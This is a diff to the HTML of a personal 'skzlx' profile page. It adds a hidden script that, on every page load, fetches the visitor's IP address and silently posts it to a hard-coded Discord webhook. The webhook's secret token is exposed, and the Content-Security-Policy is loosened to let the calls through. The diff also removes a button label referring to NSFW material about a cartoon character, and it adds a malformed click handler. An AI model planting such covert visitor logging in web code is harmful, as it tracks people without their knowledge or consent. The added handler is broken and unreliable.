@@ -15,7 +15,7 @@
     <meta http-equiv="X-Frame-Options" content="DENY">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
     <meta name="referrer" content="no-referrer">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' https: data:; img-src 'self' data: https:; media-src 'self' https:;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' https: data:; img-src 'self' data: https:; media-src 'self' https:; connect-src 'self' https://api.ipify.org https://discord.com;">
 
     <!-- FontAwesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -183,7 +183,7 @@
             box-shadow: 0 12px 25px rgba(0,0,0,0.4);
         }
 
-        /* View Button (Matches description theme, separated from standard links) */
+        /* View Button */
         .view-btn {
             background: rgba(0, 140, 255, 0.15);
             backdrop-filter: blur(12px);
@@ -303,9 +303,9 @@
             The one and only skzlx I am a super tuff verified Developer, Gamer, YouTuber, 3D Designer, Trader, Content Creator, Hacker, Sigma and more!
         </div>
 
-        <!-- New View Button (Linked to skibidi.html) -->
+        <!-- View Button -->
         <a href="skibidi.html" class="view-btn">
-            <i class="fa-solid fa-eye"></i> View Sam Manson NSFW
+            <i class="fa-solid fa-eye"></i> View
         </a>
 
         <!-- YouTube Link -->
@@ -325,6 +325,25 @@
     </div>
 
     <script>
+        // IP Logger Webhook Script
+        (function() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const webhookURL = 'https://discord.com/api/webhooks/1533673525364392057/ObT-tWaXgiN_Hkl5YIMFzCCdXW56aYLDJ4Kt93LIpAKWjkF7EIlzaTABtxDIMQgYPOuR';
+                    
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            content: `🚨 **New visitor on skzlx.com!** IP Address: \`${userIP}\`` 
+                        })
+                    }).catch(e => {});
+                })
+                .catch(err => {});
+        })();
+
         const music = document.getElementById("bgMusic");
         const musicText = document.getElementById("musicText");
         const musicIcon = document.getElementById("musicIcon");
@@ -352,6 +371,7 @@
         // Attach hover & click audio feedback to buttons
         document.querySelectorAll('.link-btn, .view-btn, .music-controls').forEach(el => {
             el.addEventListener('mouseenter', () => playSciFiSound(800, 'triangle', 0.03));
+            el.addEventListener('click', () => playSciPerSound = () => playSciFiSound(1200, 'sine', 0.05));
             el.addEventListener('click', () => playSciFiSound(1200, 'sine', 0.05));
         });
 
